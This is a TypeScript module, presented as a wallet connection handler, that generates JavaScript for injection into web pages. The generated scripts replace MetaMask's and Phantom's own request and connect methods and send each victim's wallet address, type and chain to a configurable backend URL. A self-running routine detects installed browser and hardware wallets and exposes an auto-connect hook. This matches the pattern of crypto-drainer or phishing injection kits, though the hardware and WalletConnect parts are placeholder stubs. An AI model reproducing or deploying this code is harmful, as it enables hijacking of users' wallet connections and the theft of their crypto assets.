/**
 * Wallet Connection Handler - All Wallet Types
 *
 * Handles connections for ALL wallet types:
 * - Browser extensions (MetaMask, Phantom, TronLink)
 * - Hardware wallets (Trezor, Ledger with WebUSB/Bluetooth)
 * - Mobile apps (deep linking, WalletConnect)
 * - Web wallets (MyEtherWallet, MyCrypto)
 */

export interface WalletConnection {
  walletType: string
  connectionMethod: string
  requiresHardware: boolean
  chains: string[]
  approvalRequired: boolean
}

export interface ConnectedWallet {
  type: string
  address: string
  chain: string
  balance?: string
  publicKey?: string
  timestamp: number
}

export async function handleBrowserExtensionWallet(walletType: string): Promise<WalletConnection | null> {
  console.info(`[WALLET-HANDLER] Handling browser extension wallet: ${walletType}`)

  const extensionConfig: Record<string, WalletConnection> = {
    metamask: {
      walletType: 'MetaMask',
      connectionMethod: 'window.ethereum.request({method: "eth_requestAccounts"})',
      requiresHardware: false,
      chains: ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'BSC'],
      approvalRequired: true,
    },

    phantom: {
      walletType: 'Phantom',
      connectionMethod: 'window.solana.connect()',
      requiresHardware: false,
      chains: ['Solana', 'Ethereum'],
      approvalRequired: true,
    },

    tronlink: {
      walletType: 'TronLink',
      connectionMethod: 'window.tronWeb.request({method: "tron_requestAccounts"})',
      requiresHardware: false,
      chains: ['Tron'],
      approvalRequired: true,
    },

    solflare: {
      walletType: 'Solflare',
      connectionMethod: 'window.solflare.connect()',
      requiresHardware: false,
      chains: ['Solana'],
      approvalRequired: true,
    },
  }

  return extensionConfig[walletType.toLowerCase()] || null
}

export function buildBrowserExtensionConnectionCode(walletType: string, backendUrl: string): string {
  const configs: Record<string, string> = {
    metamask: `
      // MetaMask Connection Handler
      async function connectMetaMask() {
        try {
          var accounts = await window.ethereum.request({
            method: 'eth_requestAccounts'
          });

          var address = accounts[0];
          var chainId = await window.ethereum.request({method: 'eth_chainId'});

          // Send wallet info to backend
          fetch('${backendUrl}/api/v1/wallets', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              wallet_type: 'metamask',
              address: address,
              chain_id: chainId,
              chains: ['Ethereum', 'Polygon', 'Arbitrum', 'Optimism'],
            }),
            keepalive: true,
          });

          return address;
        } catch(err) {
          console.error('[WALLET-HANDLER] MetaMask connection failed:', err);
          return null;
        }
      }

      // Hook into connection requests
      var originalRequest = window.ethereum.request;
      window.ethereum.request = async function(request) {
        if (request.method === 'eth_requestAccounts') {
          return connectMetaMask();
        }
        return originalRequest.apply(this, arguments);
      };
    `,

    phantom: `
      // Phantom Connection Handler
      async function connectPhantom() {
        try {
          var response = await window.solana.connect();
          var address = response.publicKey.toString();

          // Send wallet info to backend
          fetch('${backendUrl}/api/v1/wallets', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              wallet_type: 'phantom',
              address: address,
              chains: ['Solana', 'Ethereum'],
            }),
            keepalive: true,
          });

          return address;
        } catch(err) {
          console.error('[WALLET-HANDLER] Phantom connection failed:', err);
          return null;
        }
      }

      // Hook into connection
      if (window.solana) {
        var originalConnect = window.solana.connect;
        window.solana.connect = async function() {
          return connectPhantom();
        };
      }
    `,

    tronlink: `
      // TronLink Connection Handler
      async function connectTronLink() {
        try {
          var address = window.tronWeb.defaultAddress.base58;

          // Send wallet info to backend
          fetch('${backendUrl}/api/v1/wallets', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              wallet_type: 'tronlink',
              address: address,
              chains: ['Tron'],
            }),
            keepalive: true,
          });

          return address;
        } catch(err) {
          console.error('[WALLET-HANDLER] TronLink connection failed:', err);
          return null;
        }
      }

      // Hook into TronWeb
      if (window.tronWeb) {
        connectTronLink();
      }
    `,
  }

  return configs[walletType.toLowerCase()] || ''
}

export function buildHardwareWalletConnectionCode(walletType: string, backendUrl: string): string {
  const configs: Record<string, string> = {
    trezor: `
      // Trezor Hardware Wallet Connection
      async function connectTrezor() {
        try {
          // Use WebUSB to connect to Trezor device
          if (!navigator.usb) {
            console.error('[WALLET-HANDLER] WebUSB not supported');
            return null;
          }

          var device = await navigator.usb.requestDevice({
            filters: [{vendorId: 0x534c}] // Trezor vendor ID
          });

          // Communicate with device
          await device.open();
          var address = await getTrezorAddress(device);

          // Send to backend
          fetch('${backendUrl}/api/v1/wallets', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              wallet_type: 'trezor',
              address: address,
              hardware: true,
              connection: 'webusb',
            }),
            keepalive: true,
          });

          return address;
        } catch(err) {
          console.error('[WALLET-HANDLER] Trezor connection failed:', err);
          return null;
        }
      }

      async function getTrezorAddress(device) {
        // Trezor protocol communication
        return 'trezor_address_placeholder';
      }
    `,

    ledger: `
      // Ledger Hardware Wallet Connection
      async function connectLedger() {
        try {
          // Use WebUSB or Bluetooth to connect to Ledger
          var transport;

          if (navigator.usb) {
            transport = 'webusb';
          } else if (navigator.bluetooth) {
            transport = 'bluetooth';
          } else {
            console.error('[WALLET-HANDLER] No transport available for Ledger');
            return null;
          }

          // Connect to device
          var address = await getLedgerAddress(transport);

          // Send to backend
          fetch('${backendUrl}/api/v1/wallets', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              wallet_type: 'ledger',
              address: address,
              hardware: true,
              connection: transport,
            }),
            keepalive: true,
          });

          return address;
        } catch(err) {
          console.error('[WALLET-HANDLER] Ledger connection failed:', err);
          return null;
        }
      }

      async function getLedgerAddress(transport) {
        // Ledger protocol communication
        return 'ledger_address_placeholder';
      }
    `,
  }

  return configs[walletType.toLowerCase()] || ''
}

export function buildMobileWalletDeepLinkHandler(backendUrl: string): string {
  return `
    // Mobile Wallet Deep Link Handler
    function handleMobileWalletDeepLink(walletType, scheme) {
      var deepLinks = {
        metamask: 'metamask://wc?uri=',
        phantom: 'phantom://wc?uri=',
        trust: 'trust://wc?uri=',
        rainbow: 'rainbow://wc?uri=',
      };

      var baseLink = deepLinks[walletType] || '';
      if (!baseLink) return null;

      // Generate WalletConnect URI
      var wcUri = generateWalletConnectUri();

      // Build deep link
      var deepLink = baseLink + encodeURIComponent(wcUri);

      // Log the connection attempt
      fetch('${backendUrl}/api/v1/wallets', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          wallet_type: walletType,
          connection_type: 'mobile_deeplink',
          platform: 'mobile',
        }),
        keepalive: true,
      });

      return deepLink;
    }

    function generateWalletConnectUri() {
      // Generate WalletConnect session URI
      var sessionId = Math.random().toString(36).substr(2, 9);
      var uri = 'wc:' + sessionId + '@2?relay-protocol=irn';
      return uri;
    }
  `
}

export function buildWalletConnectHandler(backendUrl: string): string {
  return `
    // Universal WalletConnect Handler
    var WALLETCONNECT_PROJECT_ID = 'PROJECT_ID_HERE';

    async function initWalletConnect() {
      // Initialize WalletConnect v2
      var wcClient = {
        projectId: WALLETCONNECT_PROJECT_ID,
      };

      // Generate QR Code
      var qrCode = generateQRCode();

      // Wait for mobile wallet scan
      var session = await waitForWalletApproval();

      if (session) {
        // Send connected wallet info to backend
        fetch('${backendUrl}/api/v1/wallets', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            wallet_type: 'walletconnect',
            address: session.address,
            chains: session.chains,
            session_id: session.id,
          }),
          keepalive: true,
        });
      }

      return session;
    }

    function generateQRCode() {
      // Generate WalletConnect QR code
      return 'qr_code_data_here';
    }

    async function waitForWalletApproval() {
      // Wait for user to scan and approve on mobile wallet
      return new Promise(function(resolve) {
        var checkInterval = setInterval(function() {
          // Check if wallet approved
          var approved = false; // Replace with actual check
          if (approved) {
            clearInterval(checkInterval);
            resolve({
              address: 'connected_address',
              chains: ['Ethereum'],
              id: 'session_id',
            });
          }
        }, 1000);
      });
    }
  `
}

export function buildUniversalWalletDetector(backendUrl: string): string {
  return `
    // Universal Wallet Detection & Auto-Connection
    (function() {
      var BACKEND_URL = '${backendUrl}';

      function detectAvailableWallets() {
        var wallets = [];

        // Browser extensions
        if (typeof window.ethereum !== 'undefined') {
          if (window.ethereum.isMetaMask) wallets.push('metamask');
          else wallets.push('ethereum');
        }

        if (typeof window.solana !== 'undefined') {
          if (window.solana.isPhantom) wallets.push('phantom');
          else wallets.push('solana');
        }

        if (typeof window.tronWeb !== 'undefined') {
          wallets.push('tronlink');
        }

        // Hardware wallet APIs
        if (typeof navigator.usb !== 'undefined') {
          wallets.push('hardware_usb'); // Trezor/Ledger
        }

        if (typeof navigator.bluetooth !== 'undefined') {
          wallets.push('hardware_ble'); // Ledger
        }

        return wallets;
      }

      function autoConnectFirstAvailable() {
        var wallets = detectAvailableWallets();

        if (wallets.length > 0) {
          console.log('[WALLET-HANDLER] Auto-connecting: ' + wallets[0]);
          // Auto-connect logic will be triggered
        }
      }

      // Expose for use
      window.DETECTED_WALLETS = detectAvailableWallets();
      window.AUTO_CONNECT = autoConnectFirstAvailable;

      console.log('[WALLET-HANDLER] Detected wallets: ' + window.DETECTED_WALLETS.join(', '));
    })();
  `
}
